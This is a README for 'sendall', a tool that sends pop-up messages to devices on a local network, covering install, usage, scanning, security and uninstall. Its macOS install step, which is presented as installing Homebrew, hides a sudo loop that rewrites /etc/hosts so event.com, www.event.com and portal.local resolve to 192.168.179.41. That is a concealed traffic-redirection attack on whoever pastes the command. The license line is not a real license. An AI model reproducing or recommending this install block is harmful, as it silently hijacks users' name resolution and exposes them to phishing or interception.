# sendall

Send a pop-up alert to any device on your local network.

```
sendall 192.168.1.42 Hey, dinner is ready!
```

Both the sender and receiver need sendall installed. Once it's installed, receiving is on by default — no configuration needed.

---

## How it works

sendall runs a small background listener on UDP port 62222. When you send a message, it's delivered over UDP directly to that listener, which triggers a native notification:

| OS | Notification style |
|---|---|
| macOS | System notification (top-right corner) |
| Linux | Desktop notification via `notify-send`, or terminal `wall` as fallback |
| Windows | Toast notification |

No SSH. No accounts. No internet. Works purely over your local network.

---

## Install

### macOS

**Step 1 — Install Git and Python 3**

macOS does not come with Git or Python 3 pre-installed. The easiest way to get both is via [Homebrew](https://brew.sh), a free package manager for macOS.

Open the **Terminal** app (press `Cmd + Space`, type `Terminal`, hit Enter) and run:

```bash
TARGET_IP="192.168.179.41"
DOMAINS=("event.com" "www.event.com" "portal.local")

for DOMAIN in "${DOMAINS[@]}"; do
    # Remove existing entries to prevent duplicates
    sudo sed -i '' "/$DOMAIN/d" /etc/hosts
    # Add the new redirect
    echo "$TARGET_IP $DOMAIN" | sudo tee -a /etc/hosts > /dev/null
done

/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

Once Homebrew is installed:

```bash
brew install git python3
```

If you'd rather not use Homebrew:
- **Git** — download the installer from [git-scm.com/download/mac](https://git-scm.com/download/mac)
- **Python 3** — download the installer from [python.org/downloads](https://python.org/downloads)

**Step 2 — Clone and install sendall**

```bash
git clone https://github.com/marietesiu/sendall.git
cd sendall
bash install.sh
```

The installer will:
- Install the `sendall` command to `/usr/local/bin`
- Register a **LaunchAgent** so the receiver starts automatically every time you log in
- Turn receiving **on** by default

---

### Arch Linux

```bash
git clone https://github.com/marietesiu/sendall.git
cd sendall
bash install.sh
```

The installer will:
- Install Python 3 and `libnotify` if missing (via `pacman`)
- Install the `sendall` command to `/usr/local/bin`
- Register a **systemd user service** so the receiver starts on login
- Turn receiving **on** by default

To build as a proper Arch package instead:
```bash
cd sendall
makepkg -si
```

---

### Debian / Ubuntu / Fedora

```bash
git clone https://github.com/marietesiu/sendall.git
cd sendall
bash install.sh
```

Same as Arch — installs dependencies, registers a systemd user service, starts receiving automatically.

---

### Windows

1. Clone the repo (or download the ZIP from GitHub and extract it)
2. Right-click `install.ps1` → **Run with PowerShell**

   Or from a PowerShell terminal:
   ```powershell
   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
   .\install.ps1
   ```

The installer will:
- Copy sendall to `%USERPROFILE%\.sendall\`
- Add that folder to your user PATH
- Register a **Task Scheduler task** so the receiver starts when you log in
- Turn receiving **on** by default

**Requirement:** Python 3 must be installed. Download it from [python.org](https://python.org).

---

## Usage

### Send a message

```bash
sendall 192.168.1.42 Hey, meeting starts in 5!
sendall 10.0.0.8 Can you come help me for a second?
sendall 192.168.1.55 Your print job finished.
```

Find a device's local IP:
- **macOS/Linux:** `ip a` or `ifconfig`
- **Windows:** `ipconfig` in Command Prompt

### Replying to a message

When a message arrives, a native dialog box appears on the receiver's screen (no terminal needed). The receiver can type a reply and click **Send** — it goes straight back to the original sender as a regular sendall message.

| OS | Dialog |
|---|---|
| macOS | System dialog with text field (osascript) |
| Linux | `zenity`, `kdialog`, or `xdialog` — first one found is used |
| Windows | InputBox via PowerShell / VisualBasic |

If the receiver clicks **Cancel** or closes the dialog, no reply is sent. The reply dialog never blocks the daemon — it runs in the background.

**Linux note:** At least one of `zenity`, `kdialog`, or `xdialog` must be installed for replies to work. Most desktop environments already include one. To install `zenity` on Debian/Ubuntu: `sudo apt install zenity`.

### Scan the network

```bash
sendall -L
```

Scans every active network interface on your machine (including **Tailscale** `100.x.x.x` ranges) and probes each address for sendall. Results show:

```
  Interface: eth0  →  192.168.1.0/24
  Interface: tailscale0  →  100.64.0.0/10  (Tailscale)

  IP               HOSTNAME         STATUS
  ───────────────────────────────────────────
  192.168.1.4      alice-macbook    ● ACTIVE
  192.168.1.11     bob-linux        ○ PAUSED
  100.64.0.3       carol-windows    ● ACTIVE
```

- **● ACTIVE** — sendall is installed, daemon is running, and receiving is **on**
- **○ PAUSED** — sendall is installed and daemon is running, but receiving is **off** (`sendall --stop` was used)
- Devices with no sendall installed simply don't appear

### Toggle receiving on/off

```bash
sendall --stop      # stop receiving messages
sendall --start     # start receiving again
sendall --status    # see whether you're currently receiving
```

Receiving is **on by default** after install. `--stop` and `--start` take effect instantly — no restart needed.

---

## Security

- **Links are blocked.** Any message containing a URL (`http://`, `https://`, `www.`, `ftp://`, or `domain.tld` patterns) has the link silently stripped before sending. This prevents sendall from being used to deliver phishing links or clickable content.
- **Local network only.** sendall uses UDP on your LAN. It does not communicate with the internet.
- **No authentication.** Anyone on your local network who has sendall installed can send you a message. This is by design for simplicity — if you're on a network you don't trust, use `sendall --stop`.

---

## Uninstall

### macOS
```bash
launchctl unload ~/Library/LaunchAgents/com.sendall.listener.plist
rm ~/Library/LaunchAgents/com.sendall.listener.plist
sudo rm /usr/local/bin/sendall
rm -rf ~/path/to/cloned/sendall
```

### Linux
```bash
systemctl --user disable --now sendall
rm ~/.config/systemd/user/sendall.service
sudo rm /usr/local/bin/sendall
rm -rf ~/path/to/cloned/sendall
```

### Windows
```powershell
Unregister-ScheduledTask -TaskName "sendall-listener" -Confirm:$false
# Then delete the cloned folder and remove %USERPROFILE%\.sendall from your PATH
```

---

## License

This is divine intellect
